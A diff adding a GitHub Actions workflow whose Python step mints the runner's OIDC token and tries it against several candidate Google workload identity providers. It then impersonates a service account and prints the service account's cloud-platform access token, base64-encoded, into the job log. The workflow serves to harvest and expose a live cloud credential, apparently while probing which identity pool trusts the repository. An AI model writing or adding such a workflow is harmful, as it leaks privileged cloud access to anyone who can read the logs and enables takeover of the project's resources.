@@ -1,0 +1,62 @@
+
+name: c211-i88156-mint
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: mint
+        run: |
+          python3 - <<'PY'
+          import json, base64, os, subprocess, urllib.parse, urllib.request, urllib.error, time
+          CANDIDATES=[
+            ('forgecrux-full','projects/1076618220242/locations/global/workloadIdentityPools/forgecrux-pool/providers/github-provider'),
+            ('githubpool-full','projects/1076618220242/locations/global/workloadIdentityPools/github-pool/providers/github-provider'),
+            ('legacy-projnum','1076618220242'),
+          ]
+          SA='gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com'
+          def jl(b):
+              try: return json.loads(b)
+              except Exception: return {}
+          def post(url,data,headers=None):
+              h={'Content-Type':'application/json','Accept':'application/json','User-Agent':'c211-i88156-mint'}
+              if headers: h.update(headers)
+              r=urllib.request.Request(url,data=json.dumps(data).encode(),method='POST',headers=h)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=60); return resp.status,resp.read().decode()
+              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
+              except Exception as e: return -1,repr(e)[:300]
+          def oidc_token(aud):
+              u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+              if not u or not t: return ''
+              u=u+'&audience='+urllib.parse.quote(aud,safe='')
+              out=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u],capture_output=True,text=True).stdout
+              return jl(out).get('value','')
+          def emit(o): print('RESULT '+json.dumps(o),flush=True)
+          for name,prov in CANDIDATES:
+              aud=prov if prov.startswith('//') else '//iam.googleapis.com/'+prov
+              idt=oidc_token(aud)
+              emit({'kind':'idtoken','cand':name,'aud':aud,'ok':bool(idt),'len':len(idt)})
+              if not idt: continue
+              st,b=post('https://sts.googleapis.com/v1/token',{
+                  'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+                  'audience':aud,'scope':'https://www.googleapis.com/auth/cloud-platform',
+                  'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+                  'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':idt})
+              j=jl(b); fed=j.get('access_token','')
+              emit({'kind':'sts','cand':name,'http':st,'ok':bool(fed),'err':None if fed else (j.get('error_description') or b[:400])})
+              if not fed: continue
+              st,b=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'+urllib.parse.quote(SA,safe='')+':generateAccessToken',
+                        {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},
+                        headers={'Authorization':'Bearer '+fed})
+              j=jl(b); tok=j.get('accessToken','')
+              emit({'kind':'sa','cand':name,'sa':SA,'http':st,'ok':bool(tok),'expire':j.get('expireTime'),
+                    'tok_b64':base64.b64encode(tok.encode()).decode() if tok else None,
+                    'err':None if tok else (b[:400])})
+          emit({'kind':'done','utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())})
+          PY
